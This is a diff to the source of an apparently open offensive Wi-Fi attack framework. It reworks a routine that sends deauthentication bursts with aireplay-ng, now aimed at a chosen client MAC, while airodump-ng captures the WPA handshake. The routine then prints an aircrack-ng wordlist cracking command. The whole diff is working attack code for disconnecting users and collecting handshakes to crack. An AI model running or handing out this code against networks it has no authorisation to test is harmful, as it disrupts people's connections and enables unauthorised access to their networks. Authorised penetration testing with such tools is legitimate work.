@@ -7,7 +7,7 @@
 # Email: keith@redcellsecurity.org
 # Website: www.redcellsecurity.org
 #
-# Copyright (c) 2025 Keith Pachulski. All rights reserved.
+# Copyright (c) 2026 Keith Pachulski. All rights reserved.
 #
 # License: This software is licensed under the MIT License.
 #
@@ -1390,86 +1390,117 @@ class WirelessAttackFramework:
     # ------------------------------------------------------------------
 
     def _combo_deauth_handshake(self, target: dict, params: dict):
-        """
-        Concurrent: dedicated capture interface listens for the handshake
-        while the attack interface sends deauth bursts.
-        In single-interface mode falls back to sequential (capture then deauth).
-        """
-        cap_iface = self.iface_mgr.capture_interface
-        atk_iface = self.iface_mgr.attack_interface
-        airodump  = self._require_tool('airodump-ng')
-        aireplay  = self._require_tool('aireplay-ng')
-        if not airodump or not aireplay:
-            return
+            """
+            Concurrent: dedicated capture interface listens for the handshake
+            while the attack interface sends deauth bursts.
+            In single-interface mode falls back to sequential (capture then deauth).
+            """
+            cap_iface = self.iface_mgr.capture_interface
+            atk_iface = self.iface_mgr.attack_interface
+            airodump  = self._require_tool('airodump-ng')
+            aireplay  = self._require_tool('aireplay-ng')
+            if not airodump or not aireplay:
+                return
 
-        print(f"\n{'='*60}")
-        print(f" COMBO: DEAUTH + HANDSHAKE CAPTURE")
-        print(f" Target   : {target['essid']} ({target['bssid']})")
-        print(f" Channel  : {target['channel'].strip()}")
-        if self.iface_mgr.dual_interface:
-            print(f" Capture  : {cap_iface}  [dedicated - uninterrupted]")
-            print(f" Attack   : {atk_iface}  [dedicated - tx only]")
-        else:
-            print(f" Interface: {cap_iface}  [single - shared mode]")
-        print(f"{'='*60}")
+            # Select the client to target. Broadcast deauth is unreliable against
+            # modern clients - a targeted -c deauth (frames both directions) is
+            # far more effective at forcing a reassociation.
+            _, clients_by_bssid = self.scan_engine.get_snapshot() if self.scan_engine else ({}, {})
+            clients = clients_by_bssid.get(target['bssid'], [])
+            client_mac = None
 
-        self._set_target_channel(target)
+            print(f"\n Associated clients for {target['essid']}: {len(clients)}")
+            for i, c in enumerate(clients, 1):
+                print(f"   {i}. {c}")
 
-        out = str(self.temp_dir / f"combo_hs_{target['bssid'].replace(':', '')}")
-        cap_cmd = [
-            'sudo', airodump,
-            '-c', target['channel'].strip(),
-            '--bssid', target['bssid'],
-            '-w', out,
-            cap_iface,
-        ]
+            print(" 1. Broadcast (all clients - less reliable)")
+            if clients:
+                print(" 2. Select client from list")
+                print(" 3. Manual MAC entry")
+            else:
+                print(" 2. Manual MAC entry")
 
-        cap_proc = subprocess.Popen(
-            cap_cmd,
-            stdin=subprocess.DEVNULL,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-        )
-        self.registry.register('combo_capture', cap_proc)
-        time.sleep(3)
-        print(" [*] Capture running...")
+            sel = input(" Select (default 1): ").strip() or '1'
+            if sel == '2' and clients:
+                try:
+                    idx = int(input(" Client number: ").strip()) - 1
+                    if 0 <= idx < len(clients):
+                        client_mac = clients[idx]
+                except ValueError:
+                    pass
+            elif (sel == '3' and clients) or (sel == '2' and not clients):
+                client_mac = input(" Enter client MAC: ").strip() or None
 
-        if self.iface_mgr.dual_interface:
-            # True concurrent mode: deauth thread runs while capture
-            # continues uninterrupted on the separate interface
-            def deauth_loop():
-                for burst in range(3):
-                    print(f" [*] Deauth burst {burst + 1}/3  [{atk_iface}]")
-                    self._send_deauth(target, count='10')
-                    time.sleep(3)
-                print(" [*] Deauth complete - still capturing...")
+            print(f"\n{'='*60}")
+            print(f" COMBO: DEAUTH + HANDSHAKE CAPTURE")
+            print(f" Target   : {target['essid']} ({target['bssid']})")
+            print(f" Channel  : {target['channel'].strip()}")
+            print(f" Client   : {client_mac or 'broadcast'}")
+            if self.iface_mgr.dual_interface:
+                print(f" Capture  : {cap_iface}  [dedicated - uninterrupted]")
+                print(f" Attack   : {atk_iface}  [dedicated - tx only]")
+            else:
+                print(f" Interface: {cap_iface}  [single - shared mode]")
+            print(f"{'='*60}")
 
-            dt = threading.Thread(target=deauth_loop, daemon=True)
-            dt.start()
-            print(" [*] Press Ctrl+C when WPA handshake is captured\n")
-            try:
-                cap_proc.wait()
-            except KeyboardInterrupt:
-                pass
-            finally:
-                self.registry.terminate('combo_capture')
-                dt.join(timeout=5)
-        else:
-            # Single interface: brief deauth burst then back to capture
-            print(" [*] Sending deauth burst (single interface - brief interruption)...")
-            time.sleep(2)
-            self._send_deauth(target, count='10')
-            print(" [*] Deauth sent - capture resuming...")
-            print(" [*] Press Ctrl+C when WPA handshake is captured\n")
-            try:
-                cap_proc.wait()
-            except KeyboardInterrupt:
-                pass
-            finally:
-                self.registry.terminate('combo_capture')
+            self._set_target_channel(target)
 
-        print(f"\n Capture : {out}-01.cap")
-        print(f" Crack   : aircrack-ng -w wordlist {out}-01.cap")
+            out = str(self.temp_dir / f"combo_hs_{target['bssid'].replace(':', '')}")
+            cap_cmd = [
+                'sudo', airodump,
+                '-c', target['channel'].strip(),
+                '--bssid', target['bssid'],
+                '-w', out,
+                cap_iface,
+            ]
+
+            cap_proc = subprocess.Popen(
+                cap_cmd,
+                stdin=subprocess.DEVNULL,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+            self.registry.register('combo_capture', cap_proc)
+            time.sleep(3)
+            print(" [*] Capture running...")
+
+            if self.iface_mgr.dual_interface:
+                # True concurrent mode: deauth thread runs while capture
+                # continues uninterrupted on the separate interface
+                def deauth_loop():
+                    for burst in range(3):
+                        print(f" [*] Deauth burst {burst + 1}/3  [{atk_iface}]"
+                            f"  -> {client_mac or 'broadcast'}")
+                        self._send_deauth(target, count='10', client_mac=client_mac)
+                        time.sleep(3)
+                    print(" [*] Deauth complete - still capturing...")
+
+                dt = threading.Thread(target=deauth_loop, daemon=True)
+                dt.start()
+                print(" [*] Press Ctrl+C when WPA handshake is captured\n")
+                try:
+                    cap_proc.wait()
+                except KeyboardInterrupt:
+                    pass
+                finally:
+                    self.registry.terminate('combo_capture')
+                    dt.join(timeout=5)
+            else:
+                # Single interface: brief deauth burst then back to capture
+                print(" [*] Sending deauth burst (single interface - brief interruption)...")
+                time.sleep(2)
+                self._send_deauth(target, count='10', client_mac=client_mac)
+                print(" [*] Deauth sent - capture resuming...")
+                print(" [*] Press Ctrl+C when WPA handshake is captured\n")
+                try:
+                    cap_proc.wait()
+                except KeyboardInterrupt:
+                    pass
+                finally:
+                    self.registry.terminate('combo_capture')
+
+            print(f"\n Capture : {out}-01.cap")
+            print(f" Crack   : aircrack-ng -w wordlist {out}-01.cap")
 
     def _combo_evil_twin_portal(self, target: dict, params: dict):
         """
